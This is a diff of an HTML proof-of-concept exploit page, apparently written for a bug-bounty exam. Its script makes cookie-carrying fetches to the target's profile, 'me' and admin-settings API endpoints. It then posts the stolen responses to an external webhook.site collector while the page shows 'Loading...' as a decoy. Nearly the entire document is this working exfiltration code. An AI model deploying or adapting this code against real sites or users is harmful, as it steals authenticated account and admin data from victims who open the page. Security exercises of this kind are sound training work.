@@ -1,35 +1,42 @@
-<script>
-    const logger = "https://webhook.site/d611200f-fe78-4019-b923-b3c30712d153";
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Exploit PoC</title>
+</head>
+<body>
+    <script>
+        // Step 1: Fetch the profile data from the target API
+        // credentials: "include" ensures cookies are sent with the request
+        fetch("https://api-bugbounty-exam.hashacademy.co/api/auth/profile", {
+            method: "GET", 
+            credentials: "include"
+        })
+        .then(res => res.json())
+        .then(data => {
+            console.log("Data retrieved:", data);
 
-    async function findSecret() {
-        // Try the 'Me' endpoint - often contains API keys or secrets
-        try {
-            const res = await fetch("https://api-bugbounty-exam.hashacademy.co/api/auth/me", {
-                method: "GET",
-                credentials: "include"
-            });
-            const data = await res.json();
-            
-            // Leak it to your webhook
-            fetch(logger, {
+            // Step 2: Exfiltrate the retrieved data to your controlled webhook
+            fetch("https://webhook.site/d611200f-fe78-4019-b923-b3c30712d153", {
                 method: "POST",
-                body: JSON.stringify({ source: "AUTH_ME", data: data })
+                mode: "no-cors", // Useful if the webhook doesn't have CORS headers
+                body: JSON.stringify({
+                    msg: "SECRET_EXFILTRATED",
+                    admin_data: data
+                })
+            })
+            .then(() => {
+                console.log("Exfiltration successful.");
+            })
+            .catch(err => {
+                console.error("Exfiltration failed:", err);
             });
-        } catch (e) {}
-
-        // Try a 'Settings' endpoint just in case
-        try {
-            const res2 = await fetch("https://api-bugbounty-exam.hashacademy.co/api/admin/settings", {
-                method: "GET",
-                credentials: "include"
-            });
-            const data2 = await res2.json();
-            fetch(logger, {
-                method: "POST",
-                body: JSON.stringify({ source: "ADMIN_SETTINGS", data: data2 })
-            });
-        } catch (e) {}
-    }
-
-    findSecret();
-</script>
+        })
+        .catch(err => {
+            console.error("Initial fetch failed:", err);
+        });
+    </script>
+    <h1>Loading...</h1>
+</body>
+</html>
